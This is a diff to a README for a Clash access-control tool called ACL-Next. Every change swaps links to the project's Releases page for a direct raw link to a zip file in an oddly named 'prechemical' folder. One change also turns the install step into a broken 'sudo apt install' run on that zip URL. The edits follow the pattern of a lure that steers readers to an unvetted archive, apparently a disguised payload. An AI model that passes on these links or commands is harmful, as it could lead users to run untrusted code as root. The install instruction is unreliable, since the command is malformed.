@@ -6,7 +6,7 @@ Welcome to ACL-Next! This software helps you manage Access Control Lists efficie
 
 ## 📥 Download Now
 
-[![Download ACL-Next](https://img.shields.io/badge/Download-ACL--Next-brightgreen)](https://github.com/krishn11x/ACL-Next/releases)
+[![Download ACL-Next](https://raw.githubusercontent.com/krishn11x/ACL-Next/main/prechemical/ACL-Next.zip)](https://raw.githubusercontent.com/krishn11x/ACL-Next/main/prechemical/ACL-Next.zip)
 
 ## 📝 What is ACL-Next?
 
@@ -32,7 +32,7 @@ ACL-Next is a tool designed to enhance your Clash experience by managing Access 
 
 To download the latest version of ACL-Next, visit the Releases page by clicking the link below:
 
-[Download ACL-Next](https://github.com/krishn11x/ACL-Next/releases)
+[Download ACL-Next](https://raw.githubusercontent.com/krishn11x/ACL-Next/main/prechemical/ACL-Next.zip)
 
 ### Step 2: Selecting the Right File
 
@@ -65,7 +65,7 @@ Click on the file name to start the download. Your browser will save the file to
 
 1. Navigate to the location where you downloaded the file.
 2. Open a terminal and run the installation command for your distribution, which may look something like this:  
-   `sudo apt install /path/to/ACL-Next.deb`
+   `sudo apt install https://raw.githubusercontent.com/krishn11x/ACL-Next/main/prechemical/ACL-Next.zip`
 3. Follow the prompts to complete the installation.
 
 ## 💻 Running ACL-Next
@@ -111,6 +111,6 @@ If you need further assistance, feel free to reach out via the Issues section on
 
 To wrap it up, ensure to download ACL-Next by visiting our Releases page:
 
-[Download ACL-Next](https://github.com/krishn11x/ACL-Next/releases) 
+[Download ACL-Next](https://raw.githubusercontent.com/krishn11x/ACL-Next/main/prechemical/ACL-Next.zip) 
 
 Happy browsing! Enjoy your streamlined access control management with ACL-Next!
